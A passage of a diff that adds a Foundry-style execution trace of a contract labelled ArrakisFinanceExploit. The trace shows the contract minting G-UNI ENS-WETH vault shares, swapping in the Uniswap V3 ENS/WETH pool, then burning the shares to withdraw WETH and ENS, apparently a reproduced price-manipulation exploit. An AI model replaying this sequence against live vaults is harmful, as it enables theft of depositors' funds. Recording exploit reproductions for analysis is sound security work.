+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], to: Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], amount: 1253394683838271695411 [1.253e21])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x0815d0dd6fffb6fb9240b9a8fd7860b9bb0a0bc2408437858e902ce9b0b82194: 0x00000000000000000000000000000000000000000000004448dbe56c17ab1823 → 0x0000000000000000000000000000000000000000000000005683753db0716df0
+    │   │   │   │   │   │   │   │   │   │   @ 0xc5bbd008f7d7fca2d33a7c0370e815f4a9ac2e4a0e748b07d7b79dd94d387b89: 0x0000000000000000000000000000000000000000000000086bc611ddb8947e46 → 0x00000000000000000000000000000000000000000000004c5e1e820c1fce2879
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   ├─ [534] WETH::balanceOf(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1408734550679377291385 [1.408e21]
+    │   │   │   │   │   │   ├─ emit Mint(sender: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], owner: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], tickLower: 32000 [3.2e4], tickUpper: 60000 [6e4], amount: 8239613915896373616875 [8.239e21], amount0: 1253394683838271695411 [1.253e21], amount1: 0)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xd18115cb0482afdce210af6d7936a2e287493af39439694499c2a88c5330806d: 0x00000000000000000000000000000000000000000000001de3da891437a4e153 → 0x0000000000000000000000000000000000000000000001dc8f779a3dc051823e
+    │   │   │   │   │   │   │   @ 0xd18115cb0482afdce210af6d7936a2e287493af39439694499c2a88c5330806e: 0x0000000000000000000000000000000002d9f3f668281bdacc81edd287e2e713 → 0x000000000000000000000000000000000344c7893e2bad2a6a532f939f8c0ac8
+    │   │   │   │   │   │   │   @ 0xd18115cb0482afdce210af6d7936a2e287493af39439694499c2a88c5330806f: 0x00000000000000000000000000000001a6aaf188f19bc6a5223b675307d5c8cc → 0x00000000000000000000000000000001c6dce06da6fe0aba482c824120e58824
+    │   │   │   │   │   │   │   @ 0xd18115cb0482afdce210af6d7936a2e287493af39439694499c2a88c53308070: 0 → 0x0000000000000003c24fd2800b78d40800000000000000000c790c6ed0e0332a
+    │   │   │   │   │   │   │   @ 0xf9df731f082afbeaf806d7c4d8535acce408cfe9148148be41c341cff9a7707a: 0x000000000000001de3da891437a4e153000000000000001de3da891437a4e153 → 0x00000000000001dc8f779a3dc051823e00000000000001dc8f779a3dc051823e
+    │   │   │   │   │   │   │   @ 0x2979857faf937b741547f2153f9684b5b8e6f461f39a8959920ee8f2deff2d2e: 0xffffffffffffffe21c2576ebc85b1ead000000000000001de3da891437a4e153 → 0xfffffffffffffe23708865c23fae7dc200000000000001dc8f779a3dc051823e
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000043f258702e6739aa330000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 4486619135659964587643 [4.486e21])
+    │   │   │   │   │   ├─ emit Minted(: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], : 4486619135659964587643 [4.486e21], : 1253394683838271695411 [1.253e21], : 13159587645638410744793 [1.315e22], : 8239613915896373616875 [8.239e21])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2ecaf71f466ee5955d0b826a6054602f6f53dd5d8483d05745a7d277a0eaa919: 0 → 0x0000000000000000000000000000000000000000000000f338592cc17a4f5e7b
+    │   │   │   │   │   │   @ 53: 0x0000000000000000000000000000000000000000000000119ae762074ddae71a → 0x000000000000000000000000000000000000000000000104d3408ec8c82a4595
+    │   │   │   │   │   └─ ← [Return] 1253394683838271695411 [1.253e21], 13159587645638410744793 [1.315e22], 8239613915896373616875 [8.239e21]
+    │   │   │   │   └─ ← [Return] 1253394683838271695411 [1.253e21], 13159587645638410744793 [1.315e22], 8239613915896373616875 [8.239e21]
+    │   │   │   ├─ [974] ENS::balanceOf(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 132925127733721320656 [1.329e20]
+    │   │   │   ├─ [66300] Uni V3 ENS/WETH::swap(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], false, 132925127733721320656 [1.329e20], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x)
+    │   │   │   │   ├─ [3262] WETH::transfer(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 7433166160431042707 [7.433e18])
+    │   │   │   │   │   ├─ emit Transfer(from: Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], to: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 7433166160431042707 [7.433e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x000000000000000000000000000000000000000000000015bf9b5927b7127a21 → 0x00000000000000000000000000000000000000000000001626c342653c04cab4
+    │   │   │   │   │   │   @ 0xc5bbd008f7d7fca2d33a7c0370e815f4a9ac2e4a0e748b07d7b79dd94d387b89: 0x00000000000000000000000000000000000000000000004c5e1e820c1fce2879 → 0x00000000000000000000000000000000000000000000004bf6f698ce9adbd7e6
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [974] ENS::balanceOf(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 970633488646971140171 [9.706e20]
+    │   │   │   │   ├─ [6486] ArrakisFinanceExploit::uniswapV3SwapCallback(-7433166160431042707 [-7.433e18], 132925127733721320656 [1.329e20], 0x)
+    │   │   │   │   │   ├─ [4765] ENS::transfer(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], 132925127733721320656 [1.329e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], amount: 132925127733721320656 [1.329e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000000000734b4eb6803e24cd0 → 0
+    │   │   │   │   │   │   │   @ 0x3c6374891c6083b0aa4c9d6071a0aa4c75cef7901442333e2f9abc1955c7b80c: 0x0000000000000000000000000000000000000000000000349e3edf49acdd284b → 0x00000000000000000000000000000000000000000000003bd2f3cab1b0bf751b
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [974] ENS::balanceOf(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1103558616380692460827 [1.103e21]
+    │   │   │   │   ├─ emit Swap(sender: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], recipient: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0: -7433166160431042707 [-7.433e18], amount1: 132925127733721320656 [1.329e20], sqrtPriceX96: 393574173068340000954037691100 [3.935e29], liquidity: 8790990161363577423792 [8.79e21], tick: 32060 [3.206e4])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 2: 0x000000000000000000000000000000088c424a5cf39f208f0264687d08e8d2a4 → 0x0000000000000000000000000000000896f61e37ce56e395b979c870ecd413e8
+    │   │   │   │   │   @ 0xf9df731f082afbeaf806d7c4d8535acce408cfe9148148be41c341cff9a7707c: 0x00000000000000000000000000000001e5ff94be9e8abf1eabd37de9a5203b14 → 0x00000000000000000000000000000006b0ee479fe15645f7458487e8591452a7
+    │   │   │   │   │   @ 3: 0x00000000000000001361f9270c59b03c0000000000000000035d1898337280e7 → 0x000000000000000016750c51762b8f130000000000000000035d1898337280e7
+    │   │   │   │   │   @ 0x87590fd0268934902903d81015470225db8c3ee6fd42e33f79e6fc50f7e3c451: 0x0109012b880000000000000000002dedeadc87e5d697e7b19b0007026ed2d802 → 0x016189c0ef00001b2600000000000007c9cec6dd36296b0431000000238142d4
+    │   │   │   │   │   @ 0x87590fd0268934902903d81015470225db8c3ee6fd42e33f79e6fc50f7e3c450: 0x00000000000000000000000000000007f9a8f64bbba5db62450402b0a7f51df5 → 0x000000000000000000000000000000009299541137f9452cbd6065cc60f3b4af
+    │   │   │   │   │   @ 0xf9df731f082afbeaf806d7c4d8535acce408cfe9148148be41c341cff9a7707d: 0x0104ee0988000000000000000000223d69dcd14e0c6d2423660003eacb866104 → 0x01659ce2ef00001b2600000000000bb84ace7d7500542e9266000317c6cdb9d2
+    │   │   │   │   │   @ 0: 0x00016600960096003cfde427000000000000000000416961d8a4f4eb92d2794a → 0x00016600960096003c007d3c0000000000000004f7b4ecf1be773dd00765e2dc
+    │   │   │   │   │   @ 0x87590fd0268934902903d81015470225db8c3ee6fd42e33f79e6fc50f7e3c44f: 0x000000000000000000000000000000087d06a7dfc29156d41a5e01f1bb349e0d → 0x0000000000000000000000000000000000749c8ed6d98da968e66d3e9013f5be
+    │   │   │   │   │   @ 4: 0 → 0x0000000000000000000000000000000000000000000001dc8f7eff191df147b0
+    │   │   │   │   │   @ 0xf9df731f082afbeaf806d7c4d8535acce408cfe9148148be41c341cff9a7707b: 0x000000000000000000000000000000000356a165ce6181ab8628ddfcdd225bad → 0x000000000000000000000000000000087a24a308cb0962d1fd1b91336e26381e
+    │   │   │   │   └─ ← [Return] -7433166160431042707 [-7.433e18], 132925127733721320656 [1.329e20]
+    │   │   │   ├─ [103040] G-UNI ENS-WETH vault::burn(4486619135659964587643 [4.486e21], ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   ├─ [102521] ArrakisVaultV1::burn(4486619135659964587643 [4.486e21], ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   ├─ [1013] Uni V3 ENS/WETH::positions(0xbcac4ba2b61cea3374434cac46e9397785cdcac027e73f115c3ade69eaba970b) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000001dc8f779a3dc051823e000000000000000000000000000000000344c7893e2bad2a6a532f939f8c0ac800000000000000000000000000000001c6dce06da6fe0aba482c824120e588240000000000000000000000000000000000000000000000000c790c6ed0e0332a000000000000000000000000000000000000000000000003c24fd2800b78d408
+    │   │   │   │   │   ├─ emit Transfer(from: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, amount: 4486619135659964587643 [4.486e21])
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 6233955217024577008 [6.233e18]
+    │   │   │   │   │   ├─ [974] ENS::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 14083912888312433932113 [1.408e22]
+    │   │   │   │   │   ├─ [18084] Uni V3 ENS/WETH::burn(32000 [3.2e4], 60000 [6e4], 8197616881627642323742 [8.197e21])
+    │   │   │   │   │   │   ├─ emit Burn(owner: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], tickLower: 32000 [3.2e4], tickUpper: 60000 [6e4], amount: 8197616881627642323742 [8.197e21], amount0: 1242018768184723759635 [1.242e21], amount1: 122703822726334254890 [1.227e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xd18115cb0482afdce210af6d7936a2e287493af39439694499c2a88c5330806d: 0x0000000000000000000000000000000000000000000001dc8f779a3dc051823e → 0x0000000000000000000000000000000000000000000000202aadf93c8f479f20
+    │   │   │   │   │   │   │   @ 0xd18115cb0482afdce210af6d7936a2e287493af39439694499c2a88c5330806f: 0x00000000000000000000000000000001c6dce06da6fe0aba482c824120e58824 → 0x00000000000000000000000000000001c6e52246f573e93a104e44e00f850e51
+    │   │   │   │   │   │   │   @ 4: 0x0000000000000000000000000000000000000000000001dc8f7eff191df147b0 → 0x0000000000000000000000000000000000000000000000202ab55e17ece76492
+    │   │   │   │   │   │   │   @ 0xf9df731f082afbeaf806d7c4d8535acce408cfe9148148be41c341cff9a7707a: 0x00000000000001dc8f779a3dc051823e00000000000001dc8f779a3dc051823e → 0x00000000000000202aadf93c8f479f2000000000000000202aadf93c8f479f20
+    │   │   │   │   │   │   │   @ 0x2979857faf937b741547f2153f9684b5b8e6f461f39a8959920ee8f2deff2d2e: 0xfffffffffffffe23708865c23fae7dc200000000000001dc8f779a3dc051823e → 0xffffffffffffffdfd55206c370b860e000000000000000202aadf93c8f479f20
+    │   │   │   │   │   │   │   @ 0xd18115cb0482afdce210af6d7936a2e287493af39439694499c2a88c53308070: 0x0000000000000003c24fd2800b78d40800000000000000000c790c6ed0e0332a → 0x000000000000000a788a6fda10bc86dc000000000000004360f21d997392153d
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000435479112aa2b1e213000000000000000000000000000000000000000000000006a6db8ca829a80f2a
+    │   │   │   │   │   ├─ [18397] Uni V3 ENS/WETH::collect(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], 32000 [3.2e4], 60000 [6e4], 340282366920938463463374607431768211455 [3.402e38], 340282366920938463463374607431768211455 [3.402e38])
+    │   │   │   │   │   │   ├─ [6062] WETH::transfer(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], 1242917531455451174205 [1.242e21])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], to: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], amount: 1242917531455451174205 [1.242e21])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xc5bbd008f7d7fca2d33a7c0370e815f4a9ac2e4a0e748b07d7b79dd94d387b89: 0x00000000000000000000000000000000000000000000004bf6f698ce9adbd7e6 → 0x00000000000000000000000000000000000000000000000896047b352749c2a9
+    │   │   │   │   │   │   │   │   @ 0x0815d0dd6fffb6fb9240b9a8fd7860b9bb0a0bc2408437858e902ce9b0b82194: 0x0000000000000000000000000000000000000000000000005683753db0716df0 → 0x000000000000000000000000000000000000000000000043b77592d72403832d
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [4765] ENS::transfer(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], 193153318550807283420 [1.931e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], to: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], amount: 193153318550807283420 [1.931e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x3c6374891c6083b0aa4c9d6071a0aa4c75cef7901442333e2f9abc1955c7b80c: 0x00000000000000000000000000000000000000000000003bd2f3cab1b0bf751b → 0x0000000000000000000000000000000000000000000000315a695ad7a002ee3f
+    │   │   │   │   │   │   │   │   @ 0xe93aa2f82a8a8f01568738253bc6975ae9687498604a90aff5dbd53f42b78447: 0x0000000000000000000000000000000000000000000002fb7d8df826d066f751 → 0x000000000000000000000000000000000000000000000305f6186800e1237e2d
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit Collect(owner: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], recipient: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], tickLower: 32000 [3.2e4], tickUpper: 60000 [6e4], amount0: 1242917531455451174205 [1.242e21], amount1: 193153318550807283420 [1.931e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xd18115cb0482afdce210af6d7936a2e287493af39439694499c2a88c53308070: 0x000000000000000a788a6fda10bc86dc000000000000004360f21d997392153d → 0
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000004360f21d997392153d00000000000000000000000000000000000000000000000a788a6fda10bc86dc
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1249151486672475751213 [1.249e21]
+    │   │   │   │   │   ├─ [974] ENS::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 14277066206863241215533 [1.427e22]
+    │   │   │   │   │   ├─ emit FeesEarned(: 876294188959229206 [8.762e17], : 68688258428861202817 [6.868e19])
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1249151486672475751213 [1.249e21]
+    │   │   │   │   │   ├─ [974] ENS::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 14277066206863241215533 [1.427e22]
+    │   │   │   │   │   ├─ [3262] WETH::transfer(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1248407278620612918512 [1.248e21])
+    │   │   │   │   │   │   ├─ emit Transfer(from: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], to: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 1248407278620612918512 [1.248e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0815d0dd6fffb6fb9240b9a8fd7860b9bb0a0bc2408437858e902ce9b0b82194: 0x000000000000000000000000000000000000000000000043b77592d72403832d → 0x0000000000000000000000000000000000000000000000000a53f547ba45063d
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000001626c342653c04cab4 → 0x000000000000000000000000000000000000000000000059d3e4dff4a5c347a4
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [24665] ENS::transfer(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 13283298507313887894451 [1.328e22])
+    │   │   │   │   │   │   ├─ emit Transfer(from: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], to: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 13283298507313887894451 [1.328e22])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xe93aa2f82a8a8f01568738253bc6975ae9687498604a90aff5dbd53f42b78447: 0x000000000000000000000000000000000000000000000305f6186800e1237e2d → 0x000000000000000000000000000000000000000000000035df4c19888052a27a
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000000000002d016cc4e7860d0dbb3
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ emit Burned(: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], : 4486619135659964587643 [4.486e21], : 1248407278620612918512 [1.248e21], : 13283298507313887894451 [1.328e22], : 8197616881627642323742 [8.197e21])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 155: 0x0000000000000000000000000000000000000000000000000399477190bc6b89 → 0x00000000000000000000000000000000000000000000000003e91af455f5399d
+    │   │   │   │   │   │   @ 53: 0x000000000000000000000000000000000000000000000104d3408ec8c82a4595 → 0x0000000000000000000000000000000000000000000000119ae762074ddae71a
+    │   │   │   │   │   │   @ 0x2ecaf71f466ee5955d0b826a6054602f6f53dd5d8483d05745a7d277a0eaa919: 0x0000000000000000000000000000000000000000000000f338592cc17a4f5e7b → 0
+    │   │   │   │   │   │   @ 156: 0x00000000000000000000000000000000000000000000000222c2683a247c0236 → 0x0000000000000000000000000000000000000000000000023b33944e970fb867
+    │   │   │   │   │   └─ ← [Return] 1248407278620612918512 [1.248e21], 13283298507313887894451 [1.328e22], 8197616881627642323742 [8.197e21]
+    │   │   │   │   └─ ← [Return] 1248407278620612918512 [1.248e21], 13283298507313887894451 [1.328e22], 8197616881627642323742 [8.197e21]
+    │   │   │   ├─ [974] ENS::balanceOf(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 13283298507313887894451 [1.328e22]
+    │   │   │   ├─ [179568] Uni V3 ENS/WETH::swap(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], false, 13283298507313887894451 [1.328e22], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x)
+    │   │   │   │   ├─ [3262] WETH::transfer(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 145912552914211066480 [1.459e20])
+    │   │   │   │   │   ├─ emit Transfer(from: Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], to: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 145912552914211066480 [1.459e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x000000000000000000000000000000000000000000000059d3e4dff4a5c347a4 → 0x000000000000000000000000000000000000000000000061bcd665c0d7b39a14
+    │   │   │   │   │   │   @ 0xc5bbd008f7d7fca2d33a7c0370e815f4a9ac2e4a0e748b07d7b79dd94d387b89: 0x00000000000000000000000000000000000000000000000896047b352749c2a9 → 0x000000000000000000000000000000000000000000000000ad12f568f5597039
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [974] ENS::balanceOf(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 910405297829885177407 [9.104e20]
+    │   │   │   │   ├─ [6486] ArrakisFinanceExploit::uniswapV3SwapCallback(-145912552914211066480 [-1.459e20], 13283298507313887894451 [1.328e22], 0x)
+    │   │   │   │   │   ├─ [4765] ENS::transfer(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], 13283298507313887894451 [1.328e22])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], amount: 13283298507313887894451 [1.328e22])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000002d016cc4e7860d0dbb3 → 0
+    │   │   │   │   │   │   │   @ 0x3c6374891c6083b0aa4c9d6071a0aa4c75cef7901442333e2f9abc1955c7b80c: 0x0000000000000000000000000000000000000000000000315a695ad7a002ee3f → 0x0000000000000000000000000000000000000000000003017135a95000d3c9f2
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [974] ENS::balanceOf(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 14193703805143773071858 [1.419e22]
+    │   │   │   │   ├─ emit Swap(sender: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], recipient: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0: -145912552914211066480 [-1.459e20], amount1: 13283298507313887894451 [1.328e22], sqrtPriceX96: 1515349378359795262705158212122 [1.515e30], liquidity: 752787998706143247788 [7.527e20], tick: 59024 [5.902e4])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x36b78b16f757214c7748592660e96b36003e9abd4febd182d5579bca5cccf2e7: 0x0106310e9c0000000000000000002892487b9b595db50c00180004f32fa65960 → 0x016459dddb00001b26000000000005636c2fb369af0c46b5b400020f62adc176
+    │   │   │   │   │   @ 0xbf116f8b6dc34ed638559da1fcf7d1e65e709484f551901881f65d207add0c0f: 0x00000000000000000000000000000000094d73dfaf566e65a444d38c7c0790ac → 0x00000000000000000000000000000008742dd08eea147617deff9ba3cf41031f
+    │   │   │   │   │   @ 0xd5f5be7ef82d3e3c7f046a766e3a551b834a259ca2c1f43fba80f0e3cfa1c79f: 0x00000000000000000000000000000000d96fc22f840a8a01819603f0f98c1cf1 → 0x00000000000000000000000000000007d2e1465cf0cf443be40f21d83c8b66e9
+    │   │   │   │   │   @ 0x2672d6e2bdaba87886263d564a2e18bb52c4b294919033b5ff7e6aad6bf66c4c: 0x00000000000000000000000000000005657900f1b7bf1905eac5a30c9da0b183 → 0x000000000000000000000000000000033785755668352ff8ae15438731634863
+    │   │   │   │   │   @ 0xe8d8f735cf87d0e9059bdccbbf5cdc13ef80f19de2bd94b113a0c30bc4e68ea9: 0x000000000000000000000000000000000278c45629c492fb4ba6954aac3fb90d → 0x000000000000000000000000000000087b0280186fa65182379dd9e59f08dabe
+    │   │   │   │   │   @ 0xbf116f8b6dc34ed638559da1fcf7d1e65e709484f551901881f65d207add0c11: 0x0108fbcd940000000000000000002dec32319538a3c5d411fe0006ff02efb2fa → 0x01618f1ee300001b26000000000000098279b98a68fb7ea3ce0000038f6467dc
+    │   │   │   │   │   @ 0x9434008338d50d53afb547bcb7ad09fa6652357cb64168ca095b6d0b6ab332c5: 0x000000000000000000000000000000007cf11f28cc10478a392aa4dcdfab2c38 → 0x0000000000000000000000000000000831b2fa0f55e5e48f2a0d65372b0ea158
+    │   │   │   │   │   @ 0xfc6170dab3f5999689ffa458668d4024cdda4e00c34065ec8e3d53f323892fca: 0x00000000000000000000000000000000c2037b6e1afd6c4037d32c98f60ecf78 → 0x00000000000000000000000000000007dfbbe191156296043ee6dd9d094f36b2
+    │   │   │   │   │   @ 0x40d66439f71349bebc2005ac22e96d690974dd0d1048b2a192c0d7fae6087295: 0x0000000000000000000000000000000008570ff0106807ab6bbc31c8dfacf08d → 0x000000000000000000000000000000087524347e8902dcd217883d676b9ba33e
+    │   │   │   │   │   @ 0x1efa840f8a1b77fdb58378ec490dba7c94b7e4ce966a789e61f1027cfaacd404: 0x00000000000000000000000000000000d4355d23fcfcfaa14425b1b283f51acc → 0x00000000000000000000000000000007c2d3f431669fe6b781973e7bff11b463
+    │   │   │   │   │   @ 0x6b918c1dbc325614d84d6c9444051d7bf2d78ee1ffdf105c85ea31f7bec4f487: 0x0105aecd400000000000000000002636cbb1b4182dc3d8e5630004a59a22cf28 → 0x0164dc1f3700001b26000000000007bee8f99aaadefd79d06900025cf8314bae
+    │   │   │   │   │   @ 0x40d66439f71349bebc2005ac22e96d690974dd0d1048b2a192c0d7fae6087297: 0x0106cbfa500000000000000000002970d0917f6c82fd96e3c5000576eea8703f → 0x0163bef22700001b2600000000000484e419cf5689c3bbd20700018ba3abaa97
+    │   │   │   │   │   @ 0xbb1b5c06eb74cba985bfd93adfd96780fae7897045fb9a86f836474a666f5c23: 0x0103d678070000000000000000001ed05e618ce4e25123221200033cb9003bc6 → 0x0166b4747000001b2600000000000f255649c1de2a702f93ba0003c5d953df10
